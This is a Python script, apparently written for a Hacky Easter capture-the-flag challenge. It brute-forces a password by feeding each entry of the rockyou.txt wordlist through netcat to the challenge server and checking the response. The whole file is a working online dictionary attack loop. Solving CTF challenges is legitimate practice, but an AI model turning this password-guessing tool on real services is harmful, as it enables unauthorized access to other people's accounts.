import asyncio
from itertools import islice
import random
import string
import timeit
import subprocess
import numpy as np

allowed_chars = string.ascii_letters + " "

def check_password(password):
    process = subprocess.Popen(
        ["nc", "ch.hackyeaster.com", "2313"],
        stdin =subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True)

    output = ""
    process.stdin.write(password)
    process.stdin.close()
    for line in process.stdout:
        output += line.strip()
    # print(output)
    return "is incorrect" not in output

# def crack_password_old(password_list, obj):
def crack_password_old(password_list, start_idx=0):
    # tracking line no. at which password is found
    idx = 0
    # possible_solutions = []

    # open file in read byte mode only as "rockyou.txt"
    # file contains some special characters and hence
    # UnicodeDecodeError will be generated
    with open(password_list, 'rb') as file:
        for line in file:
            for word in line.split():
                word = word.decode('utf-8')
                idx += 1
                if idx < start_idx:
                    continue
                if idx % 100 == 0:
                    print(idx)
                # obj.extractall(pwd=word)
                success = check_password(word)
                success = success and check_password(word)
                success = success and check_password(word)
                success = success and check_password(word)
                success = success and check_password(word)
                if success:
                    print("Password (possibly) found at line", idx)
                    print("Password (maybe) is", word)
                    # append word to possible_solutions
                    # possible_solutions.append(word)
                    return True
    return False


password_list = "rockyou.txt"

# count of number of words present in file
cnt = len(list(open(password_list, "rb")))

print("There are total", cnt,
      "number of passwords to test")

word = "1234"
# success = check_password(word)
crack_password_old(password_list, 37048)
